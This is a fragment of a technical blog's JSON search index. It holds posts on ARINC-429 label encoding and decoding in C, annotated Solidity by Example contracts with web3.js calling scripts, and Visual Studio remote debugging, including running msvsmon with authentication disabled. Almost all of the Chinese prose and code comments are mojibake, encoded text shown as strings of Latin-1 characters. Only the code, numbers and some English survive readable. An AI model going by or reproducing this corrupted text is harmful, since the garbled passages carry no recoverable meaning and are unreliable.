","date":"2022-08-12","objectID":"/arinc429/:5:3","tags":["arinc429"],"title":"ARINC-429","uri":"/arinc429/"},{"categories":["aviation"],"content":"LABLE â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ ones â”‚ tens â”‚ hundreds â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”Œâ”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â” LSB â”‚ 8 â”‚ 7 â”‚ 6 â”‚ 5 â”‚ 4 â”‚ 3 â”‚ 2 â”‚ 1 â”‚ MSB â””â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”˜ LSB: æœ€ä½æœ‰æ•ˆä½ MSB: æœ€é«˜æœ‰æ•ˆä½ æ³¨æ„åˆ°, ä¸Šé¢çš„æœ€ä½æœ‰æ•ˆä½å’Œæœ€é«˜æœ‰æ•ˆä½ å’Œæˆ‘ä»¬å¹³æ—¶å®šä¹‰çš„æ˜¯ç›¸åçš„ å¹¶ä¸”, 8ä½è¢«åˆ†æˆäº†ä¸‰æ®µ, ç™¾ä½æ•°å¤šä¸ºäºŒè¿›åˆ¶11ä¹Ÿå°±æ˜¯3, åä½æ•°å’Œä¸ªä½æ•°æœ€å¤šä¸ºäºŒè¿›åˆ¶111ä¹Ÿå°±æ˜¯7. æ‰€ä»¥ä¸Šé¢å®é™…å°±æ˜¯å°†8ä½åˆ†æˆ3æ®µ, æ¯æ®µæ¥è¡¨ç¤ºä¸€ä¸ª8è¿›åˆ¶æ•°, å¹¶ä¸”é«˜ä½ä½ç›¸å. è¿™ç§°ä¸ºåå‘å…«è¿›åˆ¶ å¯ä»¥çœ‹å‡º, Labelæœ€å¤§ä¸º377 ","date":"2022-08-12","objectID":"/arinc429/:6:0","tags":["arinc429"],"title":"ARINC-429","uri":"/arinc429/"},{"categories":["aviation"],"content":"Labelç¼–ç  ä¸¾ä¾‹: 312è¡¨ç¤ºé£æœºçš„ground speed, å¦‚ä½•è¿›è¡Œç¼–ç : å–ç™¾ä½æ•°3, ç”¨ä¸¤ä½äºŒè¿›åˆ¶è¡¨ç¤ºä¸º11, è°ƒè½¬é«˜ä½ä½åä¸º11 å–åä½æ•°1, ç”¨ä¸‰ä½äºŒè¿›åˆ¶è¡¨ç¤ºä¸º001, è°ƒè½¬é«˜ä½ä½åä¸º100 å–ä¸ªä½æ•°2, ç”¨ä¸‰ä½äºŒè¿›åˆ¶è¡¨ç¤ºä¸º010,è°ƒè½¬é«˜ä½ä½åä¸º010 â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ ones â”‚ tens â”‚ hundreds â”‚ â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ 2 â”‚ 1 â”‚ 3 â”‚ â”œâ”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¤ MSB â”‚ 0 â”‚ 1 â”‚ 0 â”‚ 1 â”‚ 0 â”‚ 0 â”‚ 1 â”‚ 1 â”‚ LSB â””â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”˜ å¯¹ç…§ARINC429P1ä¸­çš„ ATTACHMENT 6ä¸­çš„å€¼, çš„ç¡®å¦‚æ­¤ #include \u003cstdio.h\u003e typedef unsigned int uint32_t; //æ‰“å°å‡ºæ¯ä¸€ä½ void print_bits(uint32_t x) { uint32_t i = 0; for (i = 0; i \u003c 32; i++) { printf(\"%d\", (x \u0026 0x80000000) \u003e\u003e 31); x = x \u003c\u003c 1; } } //ç¿»è½¬æŒ‡å®šçš„æ•°çš„æŒ‡å®šä½ //from: ä»å“ªä¸€ä½å¼€å§‹ç¿»è½¬(åŒ…æ‹¬), ä»ä½ä½å¼€å§‹, ä»0å¼€å§‹è®¡æ•° //to: ç»“æŸäºå“ªä¸€ä½(åŒ…æ‹¬) // æ¯”å¦‚ reverse_bits(1, 0, 2) // å°† 00000000000000000000000000000001 ä¸­çš„ 0,1,2ä½ è¿›è¡Œç¿»è½¬ // å¾—åˆ° 00000000000000000000000000000100 uint32_t reverse_bits(uint32_t x, uint32_t from, uint32_t to) { uint32_t result = 0; for (uint32_t i = from; i \u003c= to; i++) { result += (x \u003e\u003e i \u0026 1) \u003c\u003c (to - i); } return result; } uint32_t encodeLabel(uint32_t word, uint32_t x) { if (x \u003e 377) { printf(\"out of range\"); return 0; } //å°†wordçš„å‰8ä½æ¸…é›¶ word \u0026= 0xffffff00; //ä»¥xä¸º312ä¸ºä¾‹: //å¾—åˆ°ç™¾ä½æ•°3 (00000000000000000000000000000011) uint32_t hundreds = (x % 1000) / 100; //ç¿»è½¬0000000000000000000000000000011çš„ä½ä¸¤ä½, //å¾—åˆ°0000000000000000000000000000011 hundreds = reverse_bits(hundreds, 0, 1); //å°† 11 å¡«å…¥ç¬¬0,1ä½ word = word | hundreds; //å¾—åˆ°åä½æ•°1 (00000000000000000000000000000001) uint32_t tens = (x % 100) / 10; //ç¿»è½¬00000000000000000000000000000001çš„ä½ä¸‰ä½, //å¾—åˆ°00000000000000000000000000000100 tens = reverse_bits(tens, 0, 2); //å°†100å¡«å…¥ç¬¬2,3,4ä½ word = word | (tens \u003c\u003c 2); //å¾—åˆ°ä¸ªä½æ•°2 (00000000000000000000000000000010) uint32_t ones = x % 10; //ç¿»è½¬00000000000000000000000000000010çš„ä½ä¸‰ä½, //å¾—åˆ° 00000000000000000000000000000010 ones = reverse_bits(ones, 0, 2); //å°†010å¡«å…¥ç¬¬5,6,7ä½ word = word | (ones \u003c\u003c 5); return word; } int main() { print_bits(reverse_bits(0x4, 0, 2)); //100 -\u003e 001 printf(\"\\n\"); print_bits(reverse_bits(0x1, 0, 2)); //001 -\u003e 100 printf(\"\\n\"); print_bits(reverse_bits(0x1, 0, 31)); //1 -\u003e 10000000000000000000000000000000 printf(\"\\n------------\\n\"); uint32_t word = 0x22849800; print_bits(encodeLabel(word, 313)); printf(\"\\n\"); print_bits(encodeLabel(word, 323)); printf(\"\\n\"); return 0; } è¾“å‡º 00000000000000000000000000000001 00000000000000000000000000000100 10000000000000000000000000000000 ------------ 00100010100001001001100011010011 00100010100001001001100011001011 ","date":"2022-08-12","objectID":"/arinc429/:6:1","tags":["arinc429"],"title":"ARINC-429","uri":"/arinc429/"},{"categories":["aviation"],"content":"Lable è§£ç  ç†è§£äº†ç¼–ç , è§£ç å°±å¾ˆç®€å•äº† uint32_t decodeLabel(uint32_t word) { //è·å–ä½8ä½ word \u0026= 0xff; //å¾—åˆ°ç™¾ä½æ•° uint32_t hundreds = word \u0026 0x3; hundreds = reverse_bits(hundreds, 0, 1); //å¾—åˆ°åä½æ•° uint32_t tens = (word \u003e\u003e 2) \u0026 0x7; tens = reverse_bits(tens, 0, 2); //å¾—åˆ°ä¸ªä½æ•° uint32_t ones = (word \u003e\u003e 5) \u0026 0x7; ones = reverse_bits(ones, 0, 2); return hundreds * 100 + tens * 10 + ones; } ","date":"2022-08-12","objectID":"/arinc429/:6:2","tags":["arinc429"],"title":"ARINC-429","uri":"/arinc429/"},{"categories":["aviation"],"content":"DATA ","date":"2022-08-12","objectID":"/arinc429/:7:0","tags":["arinc429"],"title":"ARINC-429","uri":"/arinc429/"},{"categories":["aviation"],"content":"å¯ä¼ è¾“çš„æ•°æ®ç±»å‹ BNR äºŒè¿›åˆ¶è¡¥ç å°æ•° BCD äºŒè¿›åˆ¶ç¼–ç åè¿›åˆ¶è¡¨ç¤ºæ³• IOS5 IOS5ç¼–ç çš„å­—æ¯ä¸æ•°å­— ç¦»æ•£é‡ å›¾å½¢: åœ¨åœ°å›¾å’Œç±»ä¼¼æ˜¾ç¤ºå™¨ä¸Šä½¿ç”¨çš„çº¿ã€åœ†ã€éšæœºå®šä½çš„å­—æ¯/æ•°å­—æ–‡æœ¬å’Œå…¶ä»–ç¬¦å·ã€‚ç”¨äºæ­¤ç›®çš„çš„æŠ€æœ¯åŸºæœ¬ä¸Šç±»ä¼¼äºç”¨äº ISO 5 å­—æ¯/æ•°å­—æ•°æ®ä¼ è¾“çš„æŠ€æœ¯ã€‚ ARINC Characteristic 744Aï¼šå…·æœ‰å›¾å½¢åŠŸèƒ½çš„å…¨æ ¼å¼æ‰“å°æœºæä¾›äº†å¯ä»¥ä½¿ç”¨ ARINC 429 ä¼ è¾“çš„é™„åŠ ä¿¡æ¯å’Œç¤ºä¾‹å›¾å½¢å­—ç¬¦ã€‚ [TODO]â€¦ ","date":"2022-08-12","objectID":"/arinc429/:7:1","tags":["arinc429"],"title":"ARINC-429","uri":"/arinc429/"},{"categories":["Blockchain"],"content":"https://solidity-by-example.org ä¸­çš„ç¬¬äºŒä¸ªç»ƒä¹ , å¹¶æ·»åŠ äº†æ³¨é‡Š ","date":"2022-08-10","objectID":"/solidity-by-exampleex002firstapplication/:0:0","tags":["solidity"],"title":"[Solidity by Example]Ex002FirstApplication","uri":"/solidity-by-exampleex002firstapplication/"},{"categories":["Blockchain"],"content":"ä¹ é¢˜ https://solidity-by-example.org/first-app/ ","date":"2022-08-10","objectID":"/solidity-by-exampleex002firstapplication/:1:0","tags":["solidity"],"title":"[Solidity by Example]Ex002FirstApplication","uri":"/solidity-by-exampleex002firstapplication/"},{"categories":["Blockchain"],"content":"æ³¨é‡Š // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Ex002FirstApplication { //1. // external - å¤–éƒ¨å‡½æ•°æ˜¯ç”¨æ¥è¢«å…¶ä»–åˆçº¦è°ƒç”¨çš„ã€‚å®ƒä»¬ä¸èƒ½ç”¨äºå†…éƒ¨è°ƒç”¨ã€‚è¦åœ¨åˆçº¦ä¸­è°ƒç”¨å¤–éƒ¨å‡½æ•°ï¼Œéœ€è¦è°ƒç”¨this.function_name()ã€‚çŠ¶æ€å˜é‡ä¸èƒ½è¢«æ ‡è®°ä¸ºå¤–éƒ¨å˜é‡ã€‚ // public - å…¬å…±å‡½æ•°/å˜é‡å¯ä»¥åœ¨å¤–éƒ¨å’Œå†…éƒ¨ä½¿ç”¨ã€‚å¯¹äºå…¬å…±çŠ¶æ€å˜é‡ï¼ŒSolidityè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªgetterå‡½æ•°ã€‚ // internal - å†…éƒ¨å‡½æ•°/å˜é‡åªèƒ½ç”±å†…éƒ¨æˆ–æ´¾ç”Ÿåˆçº¦ä½¿ç”¨ã€‚ // private - ç§æœ‰å‡½æ•°/å˜é‡åªèƒ½åœ¨å†…éƒ¨ä½¿ç”¨ï¼Œç”šè‡³ä¸èƒ½è¢«æ´¾ç”Ÿåˆçº¦ä½¿ç”¨ã€‚ //è¿™ä¸ªä¾‹å­ä¸­æœ‰äº†get()å‡½æ•°, å¯èƒ½countè®¾ç½®ä¸ºprivate æˆ– internal æ›´æ°å½“ //ç±»å‹ å‚è€ƒè¿™é‡Œ https://docs.soliditylang.org/en/v0.8.14/types.html // æˆ– https://solidity-cn.readthedocs.io/zh/develop/types.html uint public count; //2. // solidity ä¸­å‡½æ•°å¯ä»¥ç”¨ä½œå˜é‡èµ‹å€¼,å‚æ•°ä¼ é€’ç­‰ // å‡½æ•°åˆ†ä¸ºå†…éƒ¨/å¤–éƒ¨å‡½æ•°, ä¹Ÿå°±æ˜¯externalå’Œinternal, é»˜è®¤æ˜¯internalå¯ä»¥ä¸å†™ // pure ä¸è¯»æ•°æ®, ä¹Ÿä¸å†™æ•°æ® ä¸æ”¹å˜è™šæ‹ŸæœºçŠ¶æ€ // view è¯»æ•°æ®, ä½†ä¸å†™æ•°æ® ä¸æ”¹å˜è™šæ‹ŸæœºçŠ¶æ€ // payable æ”¯ä»˜, å†™æ•°æ® æ”¹å˜è™šæ‹ŸæœºçŠ¶æ€ // å‚è€ƒè¿™é‡Œ https://yinhui1984.github.io/å¯¹æ™ºèƒ½åˆçº¦çš„è¯»æ–¹æ³•å’Œå†™æ–¹æ³•çš„è°ƒç”¨/ function get() public view returns (uint){ return count; } //3. //ä¸å‚æ•°ç±»å‹ç›¸æ¯”ï¼Œè¿”å›ç±»å‹ä¸èƒ½ä¸ºç©ºâ€”â€”å¦‚æœå‡½æ•°ç±»å‹ä¸åº”è¯¥è¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™æ•´ä¸ªè¿”å› (\u003creturn types\u003e ) éƒ¨åˆ†å¿…é¡»çœç•¥ã€‚ //æ²¡æœ‰æ˜ç¡®æŒ‡æ˜ pure view payable åˆ™é»˜è®¤è¦æ”¹å˜è™šæ‹ŸæœºçŠ¶æ€ function inc() public { count += 1; } function dec() public { count -= 1; } } ","date":"2022-08-10","objectID":"/solidity-by-exampleex002firstapplication/:2:0","tags":["solidity"],"title":"[Solidity by Example]Ex002FirstApplication","uri":"/solidity-by-exampleex002firstapplication/"},{"categories":["Blockchain"],"content":"åˆçº¦è°ƒç”¨ import Web3 from \"web3\" import net from \"net\" import * as fs from \"fs\" const web3 = new Web3(new Web3.providers.IpcProvider(\"../mychain/data/geth.ipc\", net)) const contractName = \"Ex002FirstApplication\" const abi = JSON.parse(fs.readFileSync(\"../contracts/build/\"+contractName+\".abi\").toString()) const address = fs.readFileSync(\"../contracts/\"+contractName+\".address\").toString() const contract = new web3.eth.Contract(abi,address) async function test(){ let accounts = await web3.eth.getAccounts() let account = accounts[0] await contract.methods.get().call().then(x =\u003e console.log(\"current value:\" + x)) //å¯¹incè°ƒç”¨call(), å¹¶ä¸ä¼šç”Ÿæ•ˆ await contract.methods.inc().call().then(()=\u003e{ contract.methods.get().call().then(x =\u003e console.log(\"after call inc(), current value:\" + x)) }) //å¯¹äºæ”¹å˜çŠ¶æ€æœºçš„å‡½æ•°, è¦è°ƒç”¨send() await contract.methods.inc().send({from:account, gas:3000000}).then(()=\u003e{ contract.methods.get().call().then(x =\u003e console.log(\"after send inc(), current value:\" + x)) }) //å¦‚æœå€¼ä¸º0,å†è°ƒç”¨inc()ä¼šæŠ¥é”™ await contract.methods.dec().send({from:account, gas:3000000}).then(()=\u003e{ contract.methods.get().call().then(x =\u003e console.log(\"after send dec(), current value:\" + x)) }).catch(e =\u003e console.log(\"\\n\\ncatch an error : \\n \"+e)) return new Promise((resolve) =\u003e { setTimeout(()=\u003e{ resolve() } , 5000) }) } test().then(()=\u003e{ process.exit(0) }) ","date":"2022-08-10","objectID":"/solidity-by-exampleex002firstapplication/:3:0","tags":["solidity"],"title":"[Solidity by Example]Ex002FirstApplication","uri":"/solidity-by-exampleex002firstapplication/"},{"categories":["Blockchain"],"content":"è¾“å‡º current value:0 after call inc(), current value:0 after send inc(), current value:1 after send dec(), current value:0 ","date":"2022-08-10","objectID":"/solidity-by-exampleex002firstapplication/:4:0","tags":["solidity"],"title":"[Solidity by Example]Ex002FirstApplication","uri":"/solidity-by-exampleex002firstapplication/"},{"categories":["Blockchain"],"content":"github https://github.com/yinhui1984/Explain-of-Solidity-by-Example ","date":"2022-08-10","objectID":"/solidity-by-exampleex002firstapplication/:5:0","tags":["solidity"],"title":"[Solidity by Example]Ex002FirstApplication","uri":"/solidity-by-exampleex002firstapplication/"},{"categories":["Blockchain"],"content":"https://solidity-by-example.org ä¸­çš„ç¬¬ä¸€ä¸ªç»ƒä¹ , å¹¶æ·»åŠ äº†æ³¨é‡Š ","date":"2022-08-10","objectID":"/solidity-by-exampleex001helloworld/:0:0","tags":["solidity"],"title":"[Solidity by Example]Ex001HelloWorld","uri":"/solidity-by-exampleex001helloworld/"},{"categories":["Blockchain"],"content":"ä¹ é¢˜: https://solidity-by-example.org/hello-world/ ","date":"2022-08-10","objectID":"/solidity-by-exampleex001helloworld/:1:0","tags":["solidity"],"title":"[Solidity by Example]Ex001HelloWorld","uri":"/solidity-by-exampleex001helloworld/"},{"categories":["Blockchain"],"content":"æ³¨é‡Š // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; //1. // è®¸å¯è¯æ ‡è¯†ç¬¦ SPDX-License-xxx: xxx // Solidity 0.6.8 å¼•å…¥äº† SPDX è®¸å¯è¯æ ‡è¯†ç¬¦ï¼Œå› æ­¤å¼€å‘äººå‘˜å¯ä»¥æŒ‡å®šåˆçº¦ä½¿ç”¨çš„è®¸å¯è¯ ã€‚ // è®¸å¯è¯åˆ—è¡¨å‚è€ƒè¿™ä¸ªè¡¨ https://spdx.org/licenses/ // å¦‚æœè®¸å¯è¯æ ‡è¯†ç¬¦æœªåŒ…å«åœ¨åˆçº¦æ–‡ä»¶ä¸­ï¼Œç¼–è¯‘å™¨ç°åœ¨å°†æ˜¾ç¤ºè­¦å‘Š // å¦‚æœåŒ…å«äº†å¤šä¸ªè®¸å¯è¯æ ‡è¯†ç¬¦ï¼Œç¼–è¯‘å™¨å°†æŠ¥é”™ //2. // pragma solidity xxx // pragma solidity ç”¨äºæŒ‡å®šåˆçº¦çš„ Solidity ç¼–è¯‘å™¨ç‰ˆæœ¬ // å¦‚æœæŒ‡å®šäº†ä¸æ”¯æŒçš„ Solidity ç‰ˆæœ¬ï¼Œç¼–è¯‘å™¨å°†æŠ¥é”™ // å¦‚æœæŒ‡å®šäº†å¤šä¸ª Solidity ç‰ˆæœ¬ï¼Œç¼–è¯‘å™¨å°†æŠ¥é”™ // å¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œåˆ™ä½¿ç”¨é»˜è®¤çš„ Solidity ç‰ˆæœ¬ // pragma æŒ‡ä»¤å§‹ç»ˆä½äºæºæ–‡ä»¶çš„æœ¬åœ°ï¼Œå› æ­¤å¦‚æœè¦åœ¨æ•´ä¸ªé¡¹ç›®ä¸­å¯ç”¨å®ƒï¼Œåˆ™å¿…é¡»å°† pragma æ·»åŠ åˆ°æ‰€æœ‰æ–‡ä»¶ä¸­ã€‚ // å¦‚æœæ‚¨å¯¼å…¥å¦ä¸€ä¸ªæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä¸­çš„ç¼–è¯‘æŒ‡ç¤ºä¸ä¼šè‡ªåŠ¨åº”ç”¨äºå¯¼å…¥æ–‡ä»¶ã€‚ // ä¾‹å­: //pragma solidity 0.6.12 - åªç”¨0.6.12ç‰ˆæœ¬çš„ç¼–è¯‘å™¨ç¼–è¯‘ //pragma solidity ^0.6.12 - å¤§äºç­‰äº0.6.12ç‰ˆæœ¬, ä½†å°äº0.7.0ç‰ˆæœ¬çš„ç¼–è¯‘å™¨ //pragma solidity \u003e=0.4.0 \u003c0.6.0 - åœ¨ å¤§äºç­‰äº0.4.0 å’Œ å°äº0.6.0ä¹‹é—´çš„ç¼–è¯‘å™¨éƒ½å¯ä»¥ //3. // contract XXX // åˆçº¦å£°æ˜, Solidityåˆçº¦æ˜¯ä¸€ä¸ªä»£ç ï¼ˆå…¶åŠŸèƒ½ï¼‰å’Œæ•°æ®ï¼ˆå…¶çŠ¶æ€ï¼‰çš„é›†åˆã€‚éƒ¨ç½²åå…¶ä¼šé©»ç•™åœ¨åŒºå—é“¾ä¸Šçš„ä¸€ä¸ªåœ°å€ä¸Š. //4. // string public greet = \"Hello World!\"; å£°æ˜äº†ä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡, å‚è€ƒè¿™é‡Œ https://www.tutorialspoint.com/solidity/solidity_strings.htm // external - å¤–éƒ¨å‡½æ•°æ˜¯ç”¨æ¥è¢«å…¶ä»–åˆçº¦è°ƒç”¨çš„ã€‚å®ƒä»¬ä¸èƒ½ç”¨äºå†…éƒ¨è°ƒç”¨ã€‚è¦åœ¨åˆçº¦ä¸­è°ƒç”¨å¤–éƒ¨å‡½æ•°ï¼Œéœ€è¦è°ƒç”¨this.function_name()ã€‚çŠ¶æ€å˜é‡ä¸èƒ½è¢«æ ‡è®°ä¸ºå¤–éƒ¨å˜é‡ã€‚ // public - å…¬å…±å‡½æ•°/å˜é‡å¯ä»¥åœ¨å¤–éƒ¨å’Œå†…éƒ¨ä½¿ç”¨ã€‚å¯¹äºå…¬å…±çŠ¶æ€å˜é‡ï¼ŒSolidityè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªgetterå‡½æ•°ã€‚ // internal - å†…éƒ¨å‡½æ•°/å˜é‡åªèƒ½ç”±å†…éƒ¨æˆ–æ´¾ç”Ÿåˆçº¦ä½¿ç”¨ã€‚ // private - ç§æœ‰å‡½æ•°/å˜é‡åªèƒ½åœ¨å†…éƒ¨ä½¿ç”¨ï¼Œç”šè‡³ä¸èƒ½è¢«æ´¾ç”Ÿåˆçº¦ä½¿ç”¨ã€‚ contract Ex001HelloWorld { string public greet = \"Hello World!\"; } ","date":"2022-08-10","objectID":"/solidity-by-exampleex001helloworld/:2:0","tags":["solidity"],"title":"[Solidity by Example]Ex001HelloWorld","uri":"/solidity-by-exampleex001helloworld/"},{"categories":["Blockchain"],"content":"åˆçº¦è°ƒç”¨ import Web3 from \"web3\"; import net from \"net\"; import * as fs from \"fs\"; const web3 = new Web3(new Web3.providers.IpcProvider(\"../mychain/data/geth.ipc\", net)); const contractName = \"Ex001HelloWorld\"; // read the contract abi from the file let abi = JSON.parse(fs.readFileSync(\"../contracts/build/\"+contractName+\".abi\").toString()); // read the contract address from the file const address = fs.readFileSync(\"../contracts/\"+contractName+\".address\").toString(); // create the contract object const contract = new web3.eth.Contract(abi, address); // get the value of the field \"greet\" contract.methods.greet.call().call().then((e) =\u003e { console.log(e); process.exit(0); }); ","date":"2022-08-10","objectID":"/solidity-by-exampleex001helloworld/:3:0","tags":["solidity"],"title":"[Solidity by Example]Ex001HelloWorld","uri":"/solidity-by-exampleex001helloworld/"},{"categories":["Blockchain"],"content":"Github https://github.com/yinhui1984/Explain-of-Solidity-by-Example ","date":"2022-08-10","objectID":"/solidity-by-exampleex001helloworld/:4:0","tags":["solidity"],"title":"[Solidity by Example]Ex001HelloWorld","uri":"/solidity-by-exampleex001helloworld/"},{"categories":["windows"],"content":"å¦‚ä½•ä½¿ç”¨Visual Studioè¿›è¡ŒC++é¡¹ç›®è¿œç¨‹è°ƒè¯• è¿™é‡Œè¯´çš„æ˜¯VS, ä¸æ˜¯VS Code ","date":"2022-07-27","objectID":"/visutal-studio-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/:0:0","tags":["vs","vc++"],"title":"Visual Studio VC++ è¿œç¨‹è°ƒè¯•","uri":"/visutal-studio-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"},{"categories":["windows"],"content":"æ™®é€šçš„å®è·µ ä¸€èˆ¬çš„æ€è·¯æ˜¯, åœ¨è¿œç¨‹æœºå™¨ä¸Šå®‰è£…VSè¿œç¨‹è°ƒè¯•å·¥å…·. å°†è°ƒè¯•æ–‡ä»¶æ‹·è´åˆ°è¿œç¨‹æœºå™¨. ä½†è¿™ä¼šå¸¦æ¥ä¸€ä¸‹é—®é¢˜ æœ¬åœ°æœºå™¨ä¿®æ”¹äº†ä»£ç ,é‡æ–°ç¼–è¯‘åéœ€è¦é‡æ–°æ‹·è´åˆ°è¿œç¨‹æœºå™¨ å¦‚æœå°†ä»£ç æ”¾åœ¨è¿œç¨‹, æœ¬æœºè®¿é—®è¿œç¨‹æœºå™¨çš„å…±äº«æ–‡ä»¶å¤¹è¿›è¡Œç¼–ç , ç„¶åç¼–è¯‘. ä¼šå¸¦æ¥é—®é¢˜: å¦‚æœç¼–è¯‘çš„é¡¹ç›®ç¨å¤§, ç¼–è¯‘è¶…æ…¢. hotloadæ›´æ˜¯æ²¡æ³•ç”¨ ","date":"2022-07-27","objectID":"/visutal-studio-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/:1:0","tags":["vs","vc++"],"title":"Visual Studio VC++ è¿œç¨‹è°ƒè¯•","uri":"/visutal-studio-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"},{"categories":["windows"],"content":"æœ€ä½³å®è·µ æ€è·¯: æœ¬åœ°æœºå™¨å…±äº«æ–‡ä»¶å¤¹, è¿œç¨‹æœºå™¨å…¬å…±è®¿é—®å…±äº«æ–‡ä»¶å¤¹æ¥è¿è¡Œç¨‹åº. è¿™æ ·ç¡®ä¿ç¼–è¯‘å’Œè¿è¡Œåœ¨åŒä¸€ç›®å½•. ä¿®æ”¹ä»£ç ,ç¼–è¯‘,è°ƒè¯•æ•ˆç‡å°±ä¼šé«˜å¾ˆå¤š. ","date":"2022-07-27","objectID":"/visutal-studio-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/:2:0","tags":["vs","vc++"],"title":"Visual Studio VC++ è¿œç¨‹è°ƒè¯•","uri":"/visutal-studio-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"},{"categories":["windows"],"content":"æ‹·è´remote debuger åˆ°VSçš„å®‰è£…ç›®å½•ä¸‹æ‹·è´remote debuger C:\\Program Files\\Microsoft Visual Studio xxx\\Common7\\IDE\\Remote Debugger å‡è®¾ä¸‹é¢ä½ çš„ç›®å½•ç»“æ„å¦‚ä¸‹: ./to_debug â”œâ”€â”€ RemoteDebugger â”‚Â â””â”€â”€ x64 â”‚Â â””â”€â”€ msvsmon.exe â””â”€â”€ my_code â””â”€â”€ debug â””â”€â”€ app.exe ","date":"2022-07-27","objectID":"/visutal-studio-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/:2:1","tags":["vs","vc++"],"title":"Visual Studio VC++ è¿œç¨‹è°ƒè¯•","uri":"/visutal-studio-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"},{"categories":["windows"],"content":"å…±äº«ç›®å½• å°†to_debugç›®å½•å…±äº«, ç¡®ä¿è¿œç¨‹æœºå™¨èƒ½è®¿é—®æ”¹å…±äº«ç›®å½• å‡è®¾æœ¬åœ°ipä¸º192.168.0.200 è¿œç¨‹æœºå™¨å¯ä»¥ \\\\192.168.0.200\\to_debug ","date":"2022-07-27","objectID":"/visutal-studio-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/:2:2","tags":["vs","vc++"],"title":"Visual Studio VC++ è¿œç¨‹è°ƒè¯•","uri":"/visutal-studio-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"},{"categories":["windows"],"content":"è¿è¡Œmsvsmon.exe åœ¨è¿œç¨‹æœºå™¨ä¸Šè®¿é—®å…±äº«æ–‡ä»¶å¤¹, ç„¶åè¿è¡Œmsvsmon.exe ç¬¬ä¸€æ¬¡è¿è¡Œæ—¶ä¼šå¼¹çª—, æŠŠèƒ½å‹¾ä¸Šçš„å…¨å‹¾ä¸Š.ç„¶ååœ¨è®¾ç½®ä¸­é€‰æ‹©â€™æ— éœ€æˆæƒéªŒè¯â€™å’Œâ€™è¶…æ—¶æ—¶é—´â€™è®¾ç½®ä¸º0 , 0è¡¨ç¤ºä¸è¶…æ—¶. è¿è¡Œå, ä¼šçœ‹åˆ°: MSvsoonå¯åŠ¨äº†åä¸ºXXXXçš„æ–°æœåŠ¡å™¨ XXXXæ˜¯æœåŠ¡å™¨åç§°å’Œç«¯å£, ç­‰ä¼šå„¿ä¼šç”¨åˆ° ","date":"2022-07-27","objectID":"/visutal-studio-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/:2:3","tags":["vs","vc++"],"title":"Visual Studio VC++ è¿œç¨‹è°ƒè¯•","uri":"/visutal-studio-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"},{"categories":["windows"],"content":"é…ç½®é¡¹ç›® åœ¨VSè§£å†³æ–¹æ¡ˆèµ„æºç®¡ç†å™¨ä¸­, å³é”®ç”¨åšå¯åŠ¨é¡¹ç›®çš„å±æ€§ é…ç½®å±æ€§ â€“\u003e è°ƒè¯• 